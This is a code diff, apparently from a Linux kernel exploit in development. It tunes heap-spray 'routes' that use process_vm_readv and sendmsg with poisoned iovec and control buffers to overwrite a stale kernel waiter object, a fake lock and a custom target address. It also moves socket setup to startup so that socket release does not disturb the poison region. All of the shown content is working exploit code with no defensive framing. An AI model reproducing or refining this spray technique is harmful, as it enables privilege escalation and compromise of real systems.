@@ -137,6 +137,15 @@ atomic_int waiter_tid;
 atomic_int punch_consume_go;
 atomic_int overlay_ready;
 atomic_int walk_done;
+static int gl_sk[2] = {-1, -1};
+
+/* opened once at startup: the route itself must not run socketpair/close
+   (their deep unix-release task_work clobbers the poison region) */
+void gl_open_route_socket(void) {
+  if (gl_sk[0] >= 0) return;
+  if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, gl_sk) != 0)
+    pr_error("route socketpair errno=%d\n", errno);
+}
 atomic_int punch_consume_stop;
 atomic_int consumer_calls;
 atomic_int consumer_success;
@@ -245,42 +254,32 @@ static void overlay_fill_words(char *buf, size_t bytes, int base_word) {
  * stale-waiter position.  Read it back from pstore after reboot. */
 void do_pvm_calib_route(void) {
   struct iovec lv[8], rv[8], siov[8];
-  char namebuf[128];
   char ctlbuf[32];
   struct msghdr msg;
 
   calib_fill_iovec(lv, 8, PVM_CALIB_BASE_L);
   calib_fill_iovec(rv, 8, PVM_CALIB_BASE_R);
   calib_fill_iovec(siov, 8, PVM_CALIB_BASE_I);
-  for (size_t i = 0; i < sizeof(namebuf) / 8; i++)
-    *(uint64_t *)(namebuf + 8 * i) = calib_marker(PVM_CALIB_BASE_A, (int)i);
   for (size_t i = 0; i < sizeof(ctlbuf) / 8; i++)
     *(uint64_t *)(ctlbuf + 8 * i) = calib_marker(PVM_CALIB_BASE_C, (int)i);
 
-  pr_info("calib: poison bases l=%llx r=%llx send_iov=%llx addr=%llx "
-          "ctl=%llx\n",
+  pr_info("calib: poison bases l=%llx r=%llx send_iov=%llx ctl=%llx\n",
           (unsigned long long)(PVM_CALIB_BASE_L << 56),
           (unsigned long long)(PVM_CALIB_BASE_R << 56),
           (unsigned long long)(PVM_CALIB_BASE_I << 56),
-          (unsigned long long)(PVM_CALIB_BASE_A << 56),
           (unsigned long long)(PVM_CALIB_BASE_C << 56));
 
   syscall(270 /* __NR_process_vm_readv */, 1, lv, 8, rv, 8, 0);
 
-  int pair[2];
-  if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, pair) == 0) {
+  if (gl_sk[0] >= 0) {
     memset(&msg, 0, sizeof(msg));
-    msg.msg_name = namebuf;
-    msg.msg_namelen = (socklen_t)sizeof(namebuf);
     msg.msg_iov = siov;
     msg.msg_iovlen = 8;
     msg.msg_control = ctlbuf;
     msg.msg_controllen = sizeof(ctlbuf);
-    sendmsg(pair[0], &msg, MSG_DONTWAIT | MSG_NOSIGNAL);
-    close(pair[0]);
-    close(pair[1]);
+    sendmsg(gl_sk[0], &msg, MSG_DONTWAIT | MSG_NOSIGNAL);
   } else {
-    pr_error("calib socketpair errno=%d\n", errno);
+    pr_error("calib: no route socket\n");
   }
   atomic_store(&main_route_delay_usec, 0);
   atomic_store(&consumer_calls, 0);
@@ -306,46 +305,38 @@ void do_pvm_overlay_route(void) {
   }
 
   int sgi0 = env_int_range("PVM_SGI0", PVM_SGI0_DEFAULT, -16, 16);
-  int sga0 = env_int_range("PVM_SGA0", PVM_SGA0_DEFAULT, -16, 16);
 
   struct iovec siov[8];
-  char namebuf[128];
   char ctlbuf[32];
   struct msghdr msg;
 
   overlay_fill_iovec(siov, 8, sgi0);
-  overlay_fill_words(namebuf, sizeof(namebuf), sga0);
   memset(ctlbuf, 0, sizeof(ctlbuf));
 
   pr_info("pvm overlay: target=%016zx value=%016zx lock=%016zx sgi0=%d "
-          "sga0=%d siov0=%016llx siov1=%016llx\n",
+          "siov0=%016llx siov1=%016llx\n",
           (unsigned long long)pselect_custom_target,
           (unsigned long long)overlay_word_value(2),
-          (unsigned long long)fake_lock, sgi0, sga0,
+          (unsigned long long)fake_lock, sgi0,
           (unsigned long long)(uintptr_t)siov[0].iov_base,
           (unsigned long long)(uintptr_t)siov[1].iov_base);
 
+  if (gl_sk[0] >= 0) {
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_iov = siov;
+    msg.msg_iovlen = 8;
+    msg.msg_control = ctlbuf;
+    msg.msg_controllen = sizeof(ctlbuf);
+    int ret = sendmsg(gl_sk[0], &msg, MSG_DONTWAIT | MSG_NOSIGNAL);
+    pr_info("pvm overlay: sendmsg ret=%d errno=%d\n", ret, errno);
+  } else {
+    pr_error("pvm overlay: no route socket\n");
+  }
   atomic_store(&main_route_delay_usec, 0);
   atomic_store(&consumer_calls, 0);
   atomic_store(&consumer_success, 0);
   atomic_store(&punch_consume_stop, 0);
   atomic_store(&punch_consume_go, 1);
-  int pair[2];
-  if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, pair) == 0) {
-    memset(&msg, 0, sizeof(msg));
-    msg.msg_name = namebuf;
-    msg.msg_namelen = (socklen_t)sizeof(namebuf);
-    msg.msg_iov = siov;
-    msg.msg_iovlen = 8;
-    msg.msg_control = ctlbuf;
-    msg.msg_controllen = sizeof(ctlbuf);
-    int ret = sendmsg(pair[0], &msg, MSG_DONTWAIT | MSG_NOSIGNAL);
-    pr_info("pvm overlay: sendmsg ret=%d errno=%d\n", ret, errno);
-    close(pair[0]);
-    close(pair[1]);
-  } else {
-    pr_error("pvm overlay socketpair errno=%d\n", errno);
-  }
   atomic_store(&overlay_ready, 1);
   for (volatile long spin = 0;
        !atomic_load(&walk_done) && spin < 400000000L; spin++) {
